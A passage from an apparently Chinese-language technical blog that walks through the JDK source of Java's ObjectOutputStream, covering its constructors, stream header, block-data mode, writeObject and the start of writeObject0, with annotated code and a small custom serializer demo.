版本</span></span><br><span class="line">        out.write(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;S&#x27;</span>, <span class="number">0x01</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeObjectOverride</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String s) &#123;</span><br><span class="line">            out.write(<span class="number">0x01</span>); <span class="comment">// 自定义类型标记：字符串</span></span><br><span class="line">            <span class="type">byte</span>[] data = s.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">            writeInt(data.length);</span><br><span class="line">            out.write(data);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(<span class="string">&quot;Only String supported in demo&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ——— 将 DataOutput 的核心写法自己实现（示例只实现最基本的）———</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123; out.write(b); &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException &#123; out.write(b, off, len); &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123; out.flush(); &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123; out.close(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeInt</span><span class="params">(<span class="type">int</span> v)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.write((v &gt;&gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        out.write((v &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        out.write((v &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        out.write(v &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">var</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">     <span class="type">var</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleObjectOutputStream</span>(baos)) &#123;</span><br><span class="line">    oos.writeObject(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    oos.writeObject(<span class="string">&quot;World&quot;</span>);</span><br><span class="line">    oos.flush();</span><br><span class="line">    <span class="type">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">    <span class="comment">// bytes 就是你自定义的“序列化格式”，需要配套的 SimpleObjectInputStream 解析</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="有参构造函数"><a href="#有参构造函数" class="headerlink" title="有参构造函数"></a>有参构造函数</h3><p>当我们使用 <code>ObjectOutputStream(OutputStream out)</code> 创建一个对象输出流并进行序列化时，实际调用的是该<strong>带参构造函数</strong>，它的实现如下所示。可以看到，这里 <code>enableOverride</code> 被设置为 <code>false</code>，意味着后续调用 <code>writeObject()</code> 等方法时，会使用 JDK 默认实现，而不是某个子类可能自定义的版本。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建一个写入到指定 OutputStream 的 ObjectOutputStream。</span></span><br><span class="line"><span class="comment"> * 本构造函数会立即向“底层 out 流”写入 Java 序列化协议的**流头部（stream header）**；</span></span><br><span class="line"><span class="comment"> * 调用者通常会在构造后立刻调用 flush()，以避免对端的 ObjectInputStream</span></span><br><span class="line"><span class="comment"> * 在读取头部时发生阻塞。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;安全管理器（SecurityManager）说明：</span></span><br><span class="line"><span class="comment"> * 如果已安装 SecurityManager，并且本构造器是由某个**子类的构造器**直接或间接调用，</span></span><br><span class="line"><span class="comment"> * 且该子类**重写**了 ObjectOutputStream.putFields 或</span></span><br><span class="line"><span class="comment"> * ObjectOutputStream.writeUnshared 等**安全敏感方法**，</span></span><br><span class="line"><span class="comment"> * 则会检查 SerializablePermission(&quot;enableSubclassImplementation&quot;) 权限。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> out  要写入的底层输出流（不得为 null）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException         写序列化流头部时发生 I/O 错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException   若不受信任的子类非法重写了安全敏感方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException 若 out 为 null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.4</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectOutputStream#ObjectOutputStream()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectOutputStream#putFields()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectInputStream#ObjectInputStream(InputStream)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 在真正初始化前做一次“子类校验”：如果调用栈中存在自定义子类且其</span></span><br><span class="line">    <span class="comment">// 重写了某些受保护/敏感的方法（如 writeUnshared/putFields），必须具备相应权限。</span></span><br><span class="line">    verifySubclass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将底层 OutputStream 包装为“块数据输出流”：</span></span><br><span class="line">    <span class="comment">// Java 序列化协议（Object Serialization Stream Protocol）中，</span></span><br><span class="line">    <span class="comment">// 普通数据常以 block-data 的形式写出（带长度前缀的块）。</span></span><br><span class="line">    bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 句柄表（handle table）：为已经写出的对象分配/管理“句柄 ID”，</span></span><br><span class="line">    <span class="comment">// 用于处理对象图中的共享引用与循环引用。</span></span><br><span class="line">    <span class="comment">// 初始容量 10，装载因子约 3.0（阈值 = 容量 * 装载因子）。</span></span><br><span class="line">    handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 替换表（substitution table）：在启用 writeReplace/enableReplaceObject</span></span><br><span class="line">    <span class="comment">// 的场景下，把某个待写对象替换成另一个对象（例如代理/值对象）再进行序列化。</span></span><br><span class="line">    subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标记当前采用“默认实现”而非“子类自定义实现”。</span></span><br><span class="line">    <span class="comment">// 当 enableOverride 为 true 时，表示子类选择自行接管写出流程。</span></span><br><span class="line">    enableOverride = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写出序列化流头部（magic、version 等），与对端 OIS 的 readStreamHeader 对应。</span></span><br><span class="line">    writeStreamHeader();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入“块数据模式”（block data mode），后续基本写入都按数据块+长度前缀编码。</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若开启扩展调试信息，则初始化调试栈，用于在异常时附加</span></span><br><span class="line">    <span class="comment">// “当前正在写哪个类/哪个字段”等上下文信息，便于定位问题。</span></span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        debugInfoStack = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在构造函数的最开始，<code>verifySubclass()</code> 用于检查<strong>调用栈中是否存在继承了 ObjectOutputStream 的自定义子类</strong>。如果存在且该子类重写了敏感方法（如 <code>writeUnshared()</code>），且当前 JVM 安装了 <code>SecurityManager</code>，那么必须具备 <code>SerializablePermission(&quot;enableSubclassImplementation&quot;)</code> 权限。否则会抛出 <code>SecurityException</code>。</p>
<p>接着将传入的 <code>OutputStream</code> 封装为 <code>BlockDataOutputStream</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将底层 OutputStream 包装为“块数据输出流”：</span></span><br><span class="line"><span class="comment">// Java 序列化协议（Object Serialization Stream Protocol）中，</span></span><br><span class="line"><span class="comment">// 普通数据常以 block-data 的形式写出（带长度前缀的块）。</span></span><br><span class="line">bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);</span><br></pre></td></tr></table></figure></div>

<p><code>BlockDataOutputStream</code> 是专用于 Java 序列化的输出封装类，它将数据写成<strong>块数据格式</strong>（block data），并配合 <code>ObjectInputStream</code> 使用的 <code>BlockDataInputStream</code> 实现数据对齐与高效读写。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates new BlockDataOutputStream on top of given underlying stream.</span></span><br><span class="line"><span class="comment"> * Block data mode is turned off by default.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">BlockDataOutputStream(OutputStream out) &#123;</span><br><span class="line">    <span class="built_in">this</span>.out = out;</span><br><span class="line">    dout = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这是 Java 内建序列化协议（Object Serialization Stream Protocol）的实现细节，和 <code>ObjectInputStream</code> 对应的 <code>BlockDataInputStream</code> 配套，负责在“<strong>块数据模式</strong>”与“<strong>非块模式</strong>”（写对象&#x2F;类描述等结构化标记，比如 <code>TC_OBJECT</code>、<code>TC_CLASSDESC</code>、<code>TC_REFERENCE</code>）之间切换，保证两边读写严格对齐。</p>
<p>之后调用 <code>writeStreamHeader()</code> 写出序列化头部内容：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写出序列化流头部（magic、version 等），与对端 OIS 的 readStreamHeader 对应。</span></span><br><span class="line">writeStreamHeader();</span><br></pre></td></tr></table></figure></div>

<p>也就是写出两个短整型值：魔数 <code>0xACED</code> 与版本号 <code>0x0005</code>，这些会被接收方 <code>ObjectInputStream</code> 在 <code>readStreamHeader()</code> 时读取并校验。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeStreamHeader</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeShort(STREAM_MAGIC);   <span class="comment">// 0xACED</span></span><br><span class="line">    bout.writeShort(STREAM_VERSION); <span class="comment">// 0x0005</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>块数据模式下，所有原始类型、数组等写入操作都会自动被包装为带有长度前缀的块（使用 <code>TC_BLOCKDATA</code> 或 <code>TC_BLOCKDATALONG</code> 标签），可以减少标记开销、提升解码效率。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进入“块数据模式”（block data mode），后续基本写入都按数据块+长度前缀编码。</span></span><br><span class="line">bout.setBlockDataMode(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="writeObject-序列化"><a href="#writeObject-序列化" class="headerlink" title="writeObject 序列化"></a>writeObject 序列化</h2><p>当 <code>ObjectOutputStream</code> 的 <code>public</code> 构造方法走完后，才会调用 <code>writeObject()</code> 开始写对象数据，该方法的主要代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定对象写入到此 ObjectOutputStream。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;写出的内容包括：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对象的&lt;b&gt;运行时类&lt;/b&gt;及其&lt;b&gt;类签名&lt;/b&gt;（如 serialVersionUID 等元信息）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;该类及其所有父类中&lt;b&gt;非 transient 且非 static&lt;/b&gt;的实例字段的当前值；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对象引用指向的其它对象会被&lt;b&gt;传递性&lt;/b&gt;写出，从而使读端可以重建完整的对象图。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;默认序列化可以通过在类中定义私有的 &#123;<span class="doctag">@code</span> writeObject(ObjectOutputStream)&#125;</span></span><br><span class="line"><span class="comment"> * 与 &#123;<span class="doctag">@code</span> readObject(ObjectInputStream)&#125; 方法来&lt;b&gt;覆盖&lt;/b&gt;，以实现自定义序列化逻辑。</span></span><br><span class="line"><span class="comment"> * 若对象实现了 &#123;<span class="doctag">@link</span> java.io.Externalizable&#125;，则改为走 &#123;<span class="doctag">@code</span> writeExternal/readExternal&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;异常处理：若写出过程中发生异常，将抛出到调用者；该异常通常使本输出流处于&lt;b&gt;未定义状态&lt;/b&gt;。</span></span><br><span class="line"><span class="comment"> * 当异常发生于&lt;b&gt;最外层&lt;/b&gt;写入（见下文 depth==0）时，当前实现还会在流中写入一个</span></span><br><span class="line"><span class="comment"> * “致命异常”标记，读端在随后读取时会抛出 &#123;<span class="doctag">@link</span> java.io.WriteAbortedException&#125;，</span></span><br><span class="line"><span class="comment"> * 其 cause 为这里的原始异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj 要写出的对象（可为 &#123;<span class="doctag">@code</span> null&#125;，此时会写入协议常量 TC_NULL）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException    用于序列化的某个类不合法（如 serialVersionUID 不匹配等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NotSerializableException 待写对象中存在未实现 &#123;<span class="doctag">@link</span> java.io.Serializable&#125; 的类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException              底层输出流抛出的任意 I/O 异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 若当前 OOS 处于“子类完全接管模式”（通过受保护的无参构造器启用），</span></span><br><span class="line">    <span class="comment">// 则调用子类的覆盖实现；否则使用本类标准实现。</span></span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">        writeObjectOverride(obj);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 核心写入：writeObject0 负责对象图遍历、类描述写出、字段编码、句柄表维护等。</span></span><br><span class="line">        <span class="comment">// 第二个参数 unshared=false 表示采用“可共享语义”（允许后续用 TC_REFERENCE 引用同一实例），</span></span><br><span class="line">        <span class="comment">// 与 writeUnshared(obj)（会传入 true）区分。</span></span><br><span class="line">        <span class="comment">// 允许 obj 为 null：内部会写协议常量 TC_NULL。</span></span><br><span class="line">        writeObject0(obj, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="comment">// depth 表示当前写入调用的“嵌套深度”（写字段/子对象时会递增）。</span></span><br><span class="line">        <span class="comment">// 仅当处于最外层（depth==0）时，向流写入“致命异常”标记与异常对象，</span></span><br><span class="line">        <span class="comment">// 以便读端在后续读取时能感知并抛出 WriteAbortedException。</span></span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">            writeFatalException(ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 重新抛出给调用者；此后该流通常应被关闭或丢弃。</span></span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="writeObject0"><a href="#writeObject0" class="headerlink" title="writeObject0"></a>writeObject0</h3><p>当 <code>enableOverride</code> 为 <code>true</code> 时调用的是 <code>ObjectOutputStream</code> 子类实现的 <code>writeObjectOverride</code>；否则会调用 JDK 自身实现的 <code>writeObject0</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 底层实现：供 &#123;<span class="doctag">@link</span> #writeObject(Object)&#125; / &#123;<span class="doctag">@link</span> #writeUnshared(Object)&#125; 调用。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;流程总览：&lt;/b&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;暂时关闭“块数据模式”（block-data mode），并增加写入深度 &#123;<span class="doctag">@code</span> depth&#125;（用于异常处理与嵌套写入）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;通过替换表 &#123;<span class="doctag">@code</span> subs.lookup(obj)&#125; 做一次“规范化/已知替换”的查找；若对象为 &#123;<span class="doctag">@code</span> null&#125; 则写出 &#123;<span class="doctag">@code</span> TC_NULL&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;在允许共享（&#123;<span class="doctag">@code</span> unshared == false&#125;）的情况下，查询句柄表 &#123;<span class="doctag">@code</span> handles&#125;，</span></span><br><span class="line"><span class="comment"> *       若该对象此前已写出，则仅写出 &#123;<span class="doctag">@code</span> TC_REFERENCE&#125;+句柄ID 并返回。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;特殊类型分支：若是 &#123;<span class="doctag">@code</span> Class&#125; 或 &#123;<span class="doctag">@code</span> ObjectStreamClass&#125;，走专门的写出逻辑。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;执行 writeReplace 链（类私有的 &#123;<span class="doctag">@code</span> writeReplace()&#125;）以及启用时的全局替换钩子</span></span><br><span class="line"><span class="comment"> *       &#123;<span class="doctag">@code</span> replaceObject(obj)&#125;，直至替换稳定。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若发生替换（&#123;<span class="doctag">@code</span> obj != orig&#125;），将映射登记到 &#123;<span class="doctag">@code</span> subs.assign(orig, obj)&#125;，</span></span><br><span class="line"><span class="comment"> *       并再次执行第 2～4 步（因为替换可能把对象变成 &#123;<span class="doctag">@code</span> null&#125; / 已写出对象 / Class / ObjectStreamClass）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;剩余分派：字符串 / 数组 / 枚举 / 实现了 &#123;<span class="doctag">@link</span> java.io.Serializable&#125; 的常规对象；</span></span><br><span class="line"><span class="comment"> *       否则抛出 &#123;<span class="doctag">@link</span> NotSerializableException&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;最终在 &#123;<span class="doctag">@code</span> finally&#125; 中恢复写入深度与原来的块数据模式。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;&#123;<span class="doctag">@code</span> unshared&#125; 的含义：&lt;/b&gt;当为 &#123;<span class="doctag">@code</span> true&#125;（来自 &#123;<span class="doctag">@link</span> #writeUnshared(Object)&#125;）</span></span><br><span class="line"><span class="comment"> * 时，禁止将此对象用句柄共享（即便之前出现过也当作“新实例”写出）；读取端需对应用</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> readUnshared&#125; 语义处理。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj      待写对象（可为 &#123;<span class="doctag">@code</span> null&#125;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared 是否使用“非共享”语义</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 底层 I/O 或协议写出过程中的异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject0</span><span class="params">(Object obj, <span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// ① 进入“结构化写入”阶段：先切到“非块数据模式”</span></span><br><span class="line">    <span class="comment">//    - 非块模式：用于写协议的结构标记（如 TC_OBJECT/TC_CLASSDESC 等），这些标记不能被</span></span><br><span class="line">    <span class="comment">//      包进块数据；否则接收端无法正确分段解析。</span></span><br><span 